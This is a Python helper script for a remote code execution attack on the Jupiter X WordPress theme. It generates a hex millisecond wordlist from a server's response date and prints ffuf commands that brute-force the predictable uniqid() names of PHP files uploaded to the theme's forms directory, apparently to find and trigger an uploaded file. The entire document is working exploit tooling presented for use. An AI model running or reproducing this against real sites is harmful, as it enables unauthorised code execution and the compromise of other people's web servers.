#!/usr/bin/python3
# coding: utf-8
import os
import argparse
from dateutil.parser import parse
from datetime import timedelta

FILE = "milliseconds.txt"

def create_file(file_path):
    """
    generate the milliseconds dictionnary
    """
    with open(file_path, "w") as handle:
        for i in range(1000000):
            handle.write(f"{i:05x}\n")

def process_arguments():
    """
    parse args
    """
    parser = argparse.ArgumentParser(description="Jupiter X RCE uniqid() Helper")
    parser.add_argument("--server-date", type=str, help="The server date", required=True)
    parser.add_argument("--wp-url", type=str, help="The WordPress URL", required=True)

    return parser.parse_args()

def main():

    args = process_arguments()

    if not os.path.exists(FILE):
        print(f'generating the file {FILE}..')
        create_file(FILE)

    if not args.wp_url.endswith('/'):
        args.wp_url += '/'

    date_parsed = parse(args.server_date)
    print(f"http response date is {args.server_date}")

    variances = [0, -1, 1]
    vary_timestamps = []

    for delta in variances:

        vary_date = date_parsed + timedelta(seconds=delta)
        vary_hex = hex(int(vary_date.timestamp()))[2:]
        
        vary_timestamps.append(vary_hex)

        print(f"response date with delta={delta} {vary_date} [{vary_hex}]")

    print('')
    print('execute by priority:')
    print(f'URL={args.wp_url}wp-content/uploads/jupiterx/forms')

    for vary_hex in vary_timestamps:
        
        print(f'ffuf -u $URL/{vary_hex}FUZZ.php -w {FILE} -o result_{vary_hex} -ignore-body')

if __name__ == "__main__":
    main()
